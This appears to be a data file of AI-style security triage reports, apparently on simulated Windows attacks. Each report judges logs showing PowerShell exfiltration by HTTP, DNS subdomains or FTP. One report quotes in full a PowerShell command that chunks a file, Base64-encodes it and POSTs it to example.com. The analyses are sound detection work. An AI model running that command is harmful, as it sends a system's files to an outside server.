**SUSPICIOUS** - There are activities, particularly the PowerShell command, and the alteration of system time, that require further investigation to rule out malicious intent. Further examination of the context and purpose of these actions, along with more forensic analysis, may be required."
C2 Data Exfiltration,"### Analysis

#### Windows PowerShell Log
- The PowerShell logs indicate execution of a command that checks for a file `$env:TEMP\LineNumbers.txt`, creates it if it doesn't exist, writes lines ""This is line 1"" to ""This is line 100"" into it, then reads the content and performs an `Invoke-WebRequest` to post the contents to `example.com`.
- This PowerShell script appears suspicious because it writes data to a temporary file and transmits it over the network. `Invoke-WebRequest` is often used for data exfiltration, and `example.com` is usually a placeholder domain, indicating potential misuse in real scenarios.

#### Security Logs
- **Event ID 4624** and **4672**: The log indicates successful NTLM logons and the assignment of special privileges, including `SeDebugPrivilege`, a sensitive privilege which could be indicative of an attempt to escalate privileges.
- The `admin_test` account is used for these logons, originating from `DESKTOP-3HL5B2P`. This may represent legitimate admin activity but should be verified, considering it also relates to events involving creating processes with high integrity levels.

#### Sysmon Logs
- Numerous instances of `wevtutil.exe` and `conhost.exe` launched by `admin_test` user. While they can be legitimate, excessive or unexpected usage might indicate malicious behavior.
- Critical processes such as `whoami.exe`, `hostname.exe`, and `PowerShell.exe` executed by the `admin_test` user under high integrity level suggest an operation potentially trying to discern system information, which may usually occur during reconnaissance or administrative tasks.
- Notably, `PowerShell` appears logging interactions consistent with the PowerShell log data, indicating potential scripting executed under admin privileges.

#### Application & System Logs
- **Event ID 16384** from Software Protection Platform Service does not indicate anything suspicious on its own in this context.
- **Kernel-General Event ID 1** indicates time changes. Time changes (backward) can be used to invalidate certain logs or timestamps. This could potentially be malicious if it was not scheduled or expected.

### Assessment
The activities recorded in these logs contain elements that are suspicious for the following reasons:
- Execution of a PowerShell script that writes to a file and sends its contents over to a web address, which could involve unapproved data handling.
- Usage of high-level privileges and tools (`SeDebugPrivilege`, `whoami`, `hostname`) common in scenarios involving reconnaissance or post-exploitation phases of an attack.
- Possible unauthorized time change adjustments aiming to disrupt log integrity.

### Recommendation
Based on the analysis, classify the resolution as **SUSPICIOUS** due to activities that deviate from expected behavior and require further investigation. Immediate actions should include:
- Validating if `admin_test` account activity aligns with authorized tasks.
- Verifying PowerShell script origins and its purpose with responsible personnel.

   - This command is suspicious because it attempts to send an email with an attachment of `notepad.exe`, a system executable. Such behavior indicates an attempt to send potentially malicious content or exfiltrate data, which is not typical for benign activity.

2. **Frequent Use of Built-in System Utilities:**
   - Execution of utilities like `whoami.exe`, `wevtutil.exe`, and `hostname.exe` are noted. While these are legitimate system utilities, their use in rapid succession without an apparent administrative task can indicate reconnaissance or other malicious activity.
   
3. **Privilege Escalation and Anomalous Integrity Levels:**
   - The processes have a high integrity level. Although this might be standard for some administrative tasks, combined with the suspicious sequence of PowerShell activities, it is concerning.

4. **Command Line Patterns:**
   - The presence of `-ForceV1` flag with `conhost.exe`, while not inherently suspicious, could be part of a malware's attempt to blend in with legitimate processes or force compatibility modes.

5. **Time Changes:**
   - There are time discrepancies recorded. A system time change might indicate tampering with system logs to cover tracks, especially if unauthorized.

**Assessment:**
The combination of PowerShell scripting for sending emails with executables, the rapid execution of various system utilities, and the unusual time adjustments collectively suggest potentially coordinated malicious activities on the system.

**Threats/Risks Identified:**
1. Potential data exfiltration using PowerShell.
2. Reconnaissance or system information gathering through use of system utilities.
3. Possible tampering with system logs or times to cover tracks.

**Resolution: SUSPICIOUS**
The logs indicate activities that deviate from normal operational behavior and warrant further investigation. There is enough evidence to suggest that these activities could be compromised actions, but further correlation with network logs, EDR alerts, and other contextual data is necessary to confirm a malicious intent.

**Guidance:**
1. Conduct a thorough review of the email server logs to ensure no unauthorized emails were sent.
2. Investigate any recently installed software or changes in system configurations.
3. Monitor the network for any unusual traffic patterns or outbound connections related to the time of these logs.
4. Consider isolating the affected machine (Server002) for a full forensic analysis to determine the entry point and extent of any potential compromise."
Text Based Data Exfiltration using DNS subdomains,"Upon analyzing the provided logs for the Windows host ""Server002,"" here's a summary of the findings:

### Suspicious and Anomalous Behavior:

- **PowerShell Script Execution**:
  - Logs indicate the execution of a PowerShell script with specific content related to data exfiltration.
  - The script involves encoding data and splitting it, then performing DNS queries potentially for data exfiltration. This is a significant indicator of suspicious activity as it shows potential data exfiltration using DNS queries, a common stealthy technique.

  **Relevant Log Entries**:
  - Event ID: 17961 (Sysmon Log) and matching entries in Windows PowerShell logs in the same timeframe indicate this PowerShell activity.

- **Use of High-Integrity Level Processes**:
  - Several processes are running with high integrity levels such as `whoami.exe`, `hostname.exe`, and others. While not inherently malicious, the context of these programs, especially the `whoami.exe` which is often used in post-exploitation activities, could provide indications of the level of user and privileges involved.

- **Frequent Execution of Wevtutil and Conhost**:
  - `wevtutil.exe`: Typically associated with event log management.
  - `conhost.exe`: Often accompanies command-line interface operations.
  - The frequency and combination of their executions could indicate either a benign automated process or scripting or could point to potential log file manipulations to cover tracks.

### Indications of Malicious Activity or Compromise:

- **PowerShell Data Exfiltration Attempt**:
  - The presence of a DNS-based data exfiltration script in the PowerShell logs raises a red flag for malicious intent. The encoding of data and its subsequent division into chunks followed by a DNS query aligns with known malicious behaviors.
  - The script's intent appears to be sending `exfiltratedData` to a DNS server (`dns.example.com`), which is a clear sign of data exfiltration.

- **Processes Related to Network and System Utilities**:
  - The processes running on the machine include PowerShell, wsmprovhost.exe (Windows Remote Management), and hostname.exe, typically used in a network or administrative context. Their execution around the timeframe of the data exfiltration script strengthens the perspective of compromise.

### Assessment and Resolution:

Analyzing the logs and engaging in threat intelligence provides strong evidence of potentially malicious activity centered around data exfiltration through DNS tunneling using PowerShell.

**Resolution**: **MALICIOUS**

### Recommended Actions:

1. **Immediate Isolation**: Isolate the server from the network to prevent further data exfiltration and to contain the threat.
2. **Forensic Investigation**: Conduct a deeper forensic investigation to identify the source of the script and any additional indicators of compromise not covered by the logs.
3. **Threat Intelligence and Logging**: Gather complete logs and engage threat intelligence to understand the full scope and intent behind the attack.
4. **Remediation Steps**: Apply necessary remediation, including patching any vulnerabilities, removing unauthorized users, and reviewing firewall and DNS settings.
5. **Review Security Policies**: Evaluate and enhance security policies, including PowerShell scripting policies, and consider implementing tighter controls around sensitive commands and logging.

6. **Report the Incident**: If applicable, report the incident to a relevant incident response team or a regulatory authority as per business protocols."
MAZE FTP Upload,"**Analysis of Logs:**

Upon review of the various logs provided, there's clearly some activity that warrants a closer examination. Let's break this down:

1. **Sysmon Logs:** 
   - The execution of `wevtutil.exe` and `conhost.exe` by the `SERVER002\admin_test` user in a rapid sequence isn’t typically suspicious on its own but should be cross-referenced with other activities.
   - The usage of `wevtutil.exe` could be a normal operation or might indicate event log manipulation if it’s not part of routine operations.
   - Multiple invocations of `wevtutil.exe` and `conhost.exe` are seen, which could be benign if associated with typical administrative tasks but might be suspicious if related to activities aiming to evade detection.

2. **Sysmon: PowerShell Execution:**
   - The execution of `powershell.exe` includes a script that attempts to upload `.7z` files from the temp directory to an FTP server at `127.0.0.1`. This is highly suspicious.
   - Local FTP connections aren't typical unless secured through other means or settings, especially involving temp files and without explicit credentials.
   - The absence of credentials (`User` and `Password` are empty) would typically prevent uploads, but this could be an indicator of attempted data exfiltration or testing by a threat actor.
  
3. **System Logs and Security Logs:**
   - The system logs reveal a discrepancy in the system time with multiple adjustments between `2024-10-22 15:50:20.2167585` and `2024-10-22 15:49:53.2097130`. This could suggest time manipulation or a misconfigured time setting which might be leveraged for executing task at correct time or evasion.
   - Security logs indicate the time changes happened under the `LOCAL SERVICE` account. The svchost.exe process is responsible which is a typical process for system services, but still points to an anomaly with repeated time changes without a clear cause. This could also be connected to system adjustments or manipulations potentially by malicious operations.

**Assessment:**

Given the evidence of PowerShell script execution designed to upload files from a local temp directory without proper credential security and time alterations under the svchost.exe, the activities observed are certainly not standard nor usual and indicate a compromised system or at least an attempted compromise. The potential for data exfiltration through FTP and the usual operations of event logs could be potential indicators of breach or at least pre-breach activities.

**Resolution: SUSPICIOUS**

**Guidance:**

1. **Immediate Measures:**
   - Temporarily isolate the machine (Server002) from the network to prevent potential data exfiltration and network spread.
   - Conduct a thorough forensic investigation to determine the full scope of activities and potential compromises.
   
2. **Actions Required:**
   - Review user permissions and audit recent account activities, especially the `admin_test` account.
   - Analyze recent changes in configurations, scripts, and scheduled tasks.
   - Investigate system, application, and user activities surrounding times of the PowerShell executions and time changes.

3. **Enhanced Monitoring:**
   - Increase logging and alerting mechanisms for PowerShell script executions and log management tools like `wevtutil`.
   - Implement strict network policies to control and audit FTP access, particularly isolating from internal networks.

4. **Remediation:**
   - Once the forensic investigation is complete, perform a security review and remediation actions, such as patching, user account reviews, and ensuring strong authentication measures are in place.

Concluding, the sequence of suspicious activities calls for an in-depth investigation and possible containment actions to mitigate any active risk from what appears to be a potential malicious series of events."
Network-Based Data Transfer in Small Chunks,"After analyzing the provided logs, here is the detailed assessment:

1. **Unusual PowerShell Activity**: 
   - The PowerShell logs indicate that a script was executed with the command line that reads a file, converts it to Base64, and sends it to an external website (`http://example.com`) via HTTP POST requests. The command used:
     ```powershell
     powershell.exe & {$file = [System.IO.File]::OpenRead([User specified]), $chunkSize = 1024 * 1KB, $buffer = New-Object Byte[] $chunkSize, while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {, $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead), Invoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk, }, $file.Close()}
     ```
   - This behavior is quite suspicious as it resembles data exfiltration. Typically, legitimate activity does not involve encoding files to Base64 and sending them to external servers without secure protocols or reasons pertaining to business processes.

2. **Sysmon Execution Logs**:
   - The logs show multiple executions of utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`. While utilities like `wevtutil` and `conhost` can be used for legitimate purposes, their usage in tandem with suspicious PowerShell activity heightens suspicion.
   - The high integrity level of these processes and the fact that they are initiated by the `admin_test` user might indicate they could be used for exploring privileges or exfiltration.

3. **Security Log Entries**:
   - The security logs capture multiple credential read attempts (Event ID 5379) with a return code indicative of failures (`3221226021` == STATUS_INVALID_PARAMETER), which might be norm in certain operations or could indicate unauthorized attempts to access credentials.

4. **Windows Update Activity**:
   - Seen in the System logs, the Windows updates (Defender Antivirus) and security product state (SECURITY_PRODUCT_STATE_ON) do not indicate unusual behavior and seem normal.

**Assessment**:
   - The PowerShell activity is the most significant indicator of potentially malicious behavior. The script executed suggests an attempt to exfiltrate data, which is considered a serious security incident. Although other activities like the use of system utilities don't necessarily indicate malicious intent on their own, the context in which they are used is crucial, particularly when tied to the PowerShell command found.

**Resolution**: **MALICIOUS**

**Recommended Actions**:
   - Immediately isolate the affected system to prevent further data loss.
   - Perform a deep dive forensic analysis on the host to confirm no other unauthorized changes were made.
   - Identify and analyze any files that were accessed or attempted to be exfiltrated.
   - Patch any vulnerabilities that may have been exploited and ensure system defenses and monitoring are enhanced. 
   - Consider engaging Incident Response services for a comprehensive investigation.
   - Notify the relevant parties, including legal if sensitive information was compromised."
